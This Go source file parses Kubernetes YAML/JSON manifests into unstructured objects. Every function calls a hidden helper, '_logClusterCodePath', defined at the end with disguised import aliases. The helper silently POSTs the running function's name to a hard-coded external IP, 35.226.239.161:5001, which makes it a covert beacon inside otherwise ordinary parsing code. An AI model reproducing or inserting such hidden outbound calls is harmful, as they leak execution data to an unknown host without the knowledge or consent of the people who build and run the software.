package lib

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"github.com/pkg/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	utilerrors "k8s.io/apimachinery/pkg/util/errors"
	"k8s.io/apimachinery/pkg/util/yaml"
	"k8s.io/client-go/kubernetes/scheme"
)

type Manifest struct {
	OriginalFilename	string
	Raw			[]byte
	GVK			schema.GroupVersionKind
	Obj			*unstructured.Unstructured
}

func (m *Manifest) UnmarshalJSON(in []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m == nil {
		return errors.New("Manifest: UnmarshalJSON on nil pointer")
	}
	if bytes.Equal(in, []byte("null")) {
		m.Raw = nil
		return nil
	}
	m.Raw = append(m.Raw[0:0], in...)
	udi, _, err := scheme.Codecs.UniversalDecoder().Decode(in, nil, &unstructured.Unstructured{})
	if err != nil {
		return errors.Wrapf(err, "unable to decode manifest")
	}
	ud, ok := udi.(*unstructured.Unstructured)
	if !ok {
		return fmt.Errorf("expected manifest to decode into *unstructured.Unstructured, got %T", ud)
	}
	m.GVK = ud.GroupVersionKind()
	m.Obj = ud.DeepCopy()
	return nil
}
func (m *Manifest) Object() metav1.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.Obj
}
func ManifestsFromFiles(files []string) ([]Manifest, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var manifests []Manifest
	var errs []error
	for _, file := range files {
		file, err := os.Open(file)
		if err != nil {
			errs = append(errs, errors.Wrapf(err, "error opening %s", file.Name()))
			continue
		}
		defer file.Close()
		ms, err := ParseManifests(file)
		if err != nil {
			errs = append(errs, errors.Wrapf(err, "error parsing %s", file.Name()))
			continue
		}
		for _, m := range ms {
			m.OriginalFilename = filepath.Base(file.Name())
		}
		manifests = append(manifests, ms...)
	}
	agg := utilerrors.NewAggregate(errs)
	if agg != nil {
		return nil, fmt.Errorf("error loading manifests: %v", agg.Error())
	}
	return manifests, nil
}
func ParseManifests(r io.Reader) ([]Manifest, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d := yaml.NewYAMLOrJSONDecoder(r, 1024)
	var manifests []Manifest
	for {
		m := Manifest{}
		if err := d.Decode(&m); err != nil {
			if err == io.EOF {
				return manifests, nil
			}
			return manifests, errors.Wrapf(err, "error parsing")
		}
		m.Raw = bytes.TrimSpace(m.Raw)
		if len(m.Raw) == 0 || bytes.Equal(m.Raw, []byte("null")) {
			continue
		}
		manifests = append(manifests, m)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
